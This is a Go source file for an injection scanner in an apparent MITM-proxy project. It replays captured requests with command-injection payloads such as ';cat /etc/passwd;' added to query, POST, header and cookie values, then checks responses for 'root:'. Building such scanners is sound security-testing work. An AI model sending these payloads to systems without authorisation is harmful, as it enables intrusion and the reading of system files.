package scanner

import (
	"bytes"
	"fmt"
	"github.com/MatiXxD/go-mitm-proxy/internal/models"
	"io"
	"net/http"
)

var defaultInjections = []string{
	";cat /etc/passwd;",
	"|cat /etc/passwd|",
	"`cat /etc/passwd`",
}

var defaultInjectionsResults = []string{
	"root:",
}

type InjectionScanner interface {
	Scan(*models.ParsedRequest) *InjectionReport
}

type Scanner struct {
	injections        []string
	injectionsResults []string
}

func NewInjectionScanner(injections, injectionsResults []string) InjectionScanner {
	if injections == nil || len(injections) == 0 {
		injections = defaultInjections
	}

	if injectionsResults == nil || len(injectionsResults) == 0 {
		injectionsResults = defaultInjectionsResults
	}

	return &Scanner{
		injections:        injections,
		injectionsResults: injectionsResults,
	}
}

func (s *Scanner) Scan(parsedReq *models.ParsedRequest) *InjectionReport {
	report := &InjectionReport{}

	// testing query
	for param := range parsedReq.Form {
		for _, inj := range s.injections {
			injReq := models.CloneParsedRequest(parsedReq)
			injReq.Form.Set(param, injReq.Form.Get(param)+inj)
			fmt.Printf("Test injection with: %v\n", injReq)
			req, _ := newRequest(injReq)
			if s.checkInjection(req) {
				report.VulnerableGETParams = append(report.VulnerableGETParams, param)
			}
		}
	}

	// testing POST
	if parsedReq.Method == "POST" && len(parsedReq.PostForm) > 0 {
		for param := range parsedReq.PostForm {
			for _, inj := range s.injections {
				injReq := models.CloneParsedRequest(parsedReq)
				injReq.PostForm.Set(param, injReq.PostForm.Get(param)+inj)
				fmt.Printf("Test injection with: %v\n", injReq)
				req, _ := newRequest(injReq)
				if s.checkInjection(req) {
					report.VulnerablePOSTParams = append(report.VulnerablePOSTParams, param)
				}
			}
		}
	}

	// testing headers
	for header := range parsedReq.Header {
		for _, inj := range s.injections {
			injReq := models.CloneParsedRequest(parsedReq)
			injReq.Header.Set(header, injReq.Header.Get(header)+inj)
			fmt.Printf("Test injection with: %v\n", injReq)
			req, _ := newRequest(injReq)
			if s.checkInjection(req) {
				report.VulnerableHeaders = append(report.VulnerableHeaders, header)
			}
		}
	}

	// testing cookies
	for i, _ := range parsedReq.Cookies {
		for _, inj := range s.injections {
			injReq := models.CloneParsedRequest(parsedReq)
			c := *injReq.Cookies[i]
			c.Value = c.Value + inj
			fmt.Printf("Test injection with: %v\n", injReq)
			req, _ := newRequest(injReq)
			if s.checkInjection(req) {
				report.VulnerableCookies = append(report.VulnerableCookies, c.String())
			}
		}
	}

	return report
}

func (s *Scanner) checkInjection(req *http.Request) bool {
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	for _, injRes := range s.injectionsResults {
		if bytes.Contains(body, []byte(injRes)) {
			return true
		}
	}

	return false
}

func newRequest(parsedReq *models.ParsedRequest) (*http.Request, error) {
	req, err := http.NewRequest(parsedReq.Method, parsedReq.URL, bytes.NewBuffer([]byte(parsedReq.Body)))
	if err != nil {
		return nil, err
	}

	req.Host = parsedReq.URL
	req.ContentLength = parsedReq.ContentLength

	req.Header = parsedReq.Header
	for _, cookie := range parsedReq.Cookies {
		req.AddCookie(cookie)
	}

	req.PostForm = parsedReq.PostForm
	req.Form = parsedReq.Form

	return req, nil
}
